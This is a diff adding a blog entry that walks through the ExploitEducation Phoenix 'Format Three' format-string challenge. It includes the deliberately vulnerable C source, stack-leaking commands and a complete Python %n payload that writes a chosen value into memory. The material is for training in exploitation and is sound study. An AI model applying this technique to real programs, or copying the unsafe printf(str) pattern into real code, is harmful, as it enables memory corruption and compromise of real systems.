@@ -16,6 +16,167 @@
 
         <div class="rolling-container">
         <!-- BLOG START -->
+<!-- ID:Writeup: ExploitEducation - Format Three [i486] START -->
+<div class="rolling-entry">
+<h1><a href="https://blog.danieliu.xyz/blog/html/Writeup: ExploitEducation - Format Three [i486].html">Writeup: ExploitEducation - Format Three [i486]</a></h1>
+<p class="rolling-date">Tue, Jun 15 13:06</p>
+<hr>
+<p>
+Today, we will be solving Format Three in ExploitEducation Phoenix, you can find it <a href="https://exploit.education/phoenix/format-three/">here</a>. Here's the source code for the challenge, our goal is to modify the 'changeme' variable:
+</p>
+
+<pre><code>#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int changeme;
+
+void bounce(char *str) {
+  printf(str);
+}
+
+int main(int argc, char **argv) {
+  char buf[4096];
+  printf("%s\n", BANNER);
+
+  if (read(0, buf, sizeof(buf) - 1) <= 0) {
+    exit(EXIT_FAILURE);
+  }
+
+  bounce(buf);
+
+  if (changeme == 0x64457845) {
+    puts("Well done, the 'changeme' variable has been changed correctly!");
+  } else {
+    printf(
+        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
+  }
+
+  exit(0);
+}
+</code></pre>
+
+<p>
+We already know that you can write to any memory location using the %n conversion specifier, but now, this challenge is asking us to write a specific value. %n will write to the memory location specified the number of characters that were written so far. However, our buffer is only 4096 bytes long, and the value we wish to write is 0x64457845 - which happens to be 1682274373 in decimal. Obviously that won't work.
+</p>
+
+<p>
+First, let's just make sure we can even write to the variable. Let's find the location of the variable with:
+</p>
+<code>
+nm format-three
+</code>
+<p>
+and we find that 'changeme' is located at 0x08049844.
+</p>
+
+<p>
+We need to first find out how far down the stack the function arguments are, so we'll just throw a bunch of %x's at the program and leak a bunch of the stack. We're just padding the memory locations up to 8 characters and adding a space to make it a bit more readable:
+</p>
+<code>
+python -c 'print("AAAA"+"%08x "*200)' | ./format-three
+</code>
+
+<p>
+Here's a bit of the output
+</p>
+<code>
+AAAA00000000 00000000 00000000 f7f81cf7 f7ffb000 ffffd738 08048556 ffffc730 ffffc730 00000fff 00000000 41414141 78383025 38302520 ...
+</code>
+<p>
+Alright nice! Our AAAA shows up exactly 11 words down the stack, as shown by the block of 41414141, so this means that we need to consume exactly 11 printf conversion specifiers.
+</p>
+
+<p>
+Just to make sure everything works, we can try writing something to the variable now. Simply replace the AAAA in front of our payload with the memory address of 'changeme', and call %n at the end of the string:
+</p>
+<code>
+python -c 'print("\x08\x04\x98\x44"+"%08x "*11+"%n")' | ./format-three
+</code>
+<p>
+And we get this:
+</p>
+<code>
+Better luck next time - got 0x00000067, wanted 0x64457845!
+</code>
+<p>
+We got something! We have successfully corrupted memory, now's only a matter of writing the values we want. The value we wrote was 0x67 since that's the number of characters we have written so far, you can try verifying this yourself. Now, remember the issue we talked about before how the number we wish to write was too large? Let's tackle that now.
+</p>
+
+<p>
+What we can actually do is write the number in chunks, one byte chunks to be specific. Thus, all we need to do is pass printf four separate memory locations and write 0x45, 0x78, 0x45 and 0x64 - which are 69, 120, 69 and 100 respectively.
+</p>
+
+<p>
+So instead of passing just the one memory location in the beginning, we will pass four. Then we can control the value that is written by padding some characters the tick up the value that %n writes. Let's more our exploit to a python script that we can pipe into the executable instead:
+</p>
+<pre><code>loc1="\x44\x98\x04\x08"
+loc2="\x45\x98\x04\x08"
+loc3="\x46\x98\x04\x08"
+loc4="\x47\x98\x04\x08"
+</code></pre>
+<p>
+You may have noticed a problem by now. We want to write two 0x45s, but there's no way of accomplishing that, as %n only ticks up. What we can try to do is two writes one after the other and have loc2 be \x46, but then once we wish to write to \x45, %n will write 8 bytes and overwrite what we put in \x46 earlier, here's a little diagram:
+</p>
+<pre><code>47 46 45 44
+===========
+00 00 00 00
+00 00 00 45
+00 45 00 45
+64 45 00 45
+00 00 78 45 <- oh nos!!
+</code></pre>
+<p>
+How about this for an idea, instead, write 0x0145 and 0x0164 on \x46 and \x47 respectively, and we can simply overwrite the extra stuff on our next write. Here's what this would look like:
+</p>
+<pre><code>48 47 46 45 44 | %n
+===============|====
+00 00 00 00 00 | 000
+00 00 00 00 45 | 045
+00 00 00 78 45 | 078
+00 01 45 78 45 | 145
+01 64 45 78 45 | 164
+   ** ** ** **
+</code></pre>
+<p>
+and as you can see, %n is only increasing, and we are writing our bytes in order, so this should work! Here's the final python script:
+</p>
+<pre><code>loc1="\x44\x98\x04\x08"
+loc2="\x45\x98\x04\x08"
+loc3="\x46\x98\x04\x08"
+loc4="\x47\x98\x04\x08"
+
+consume="%c"*11
+write="%n"
+pad1="A"*42
+pad2="A"*51
+pad3="A"*205
+pad4="A"*31
+print(loc1+loc2+loc3+loc4+consume+pad1+write+pad2+write+pad3+write+pad4+write)
+</code></pre>
+
+<p>
+You can easily check the padding values are right yourself. Our four locations take up 16 bytes, and our consume string uses 11 bytes, the first number we want to write is 69 so we need to pad 69-16-11=42 bytes, and so on for the rest of the values.
+</p> 
+
+<p>
+piping this into format-three gives us:
+</p>
+<code>
+Well done, the 'changeme' variable has been changed correctly!
+</code>
+<p>
+We did it!
+</p>
+
+
+</div>
+<!-- ID:Writeup: ExploitEducation - Format Three [i486] END -->
 <!-- ID:ミニVIMヒント第1章 START -->
 <div class="rolling-entry">
 <h1><a href="https://blog.danieliu.xyz/blog/html/ミニVIMヒント第1章.html">ミニVIMヒント第1章</a></h1>
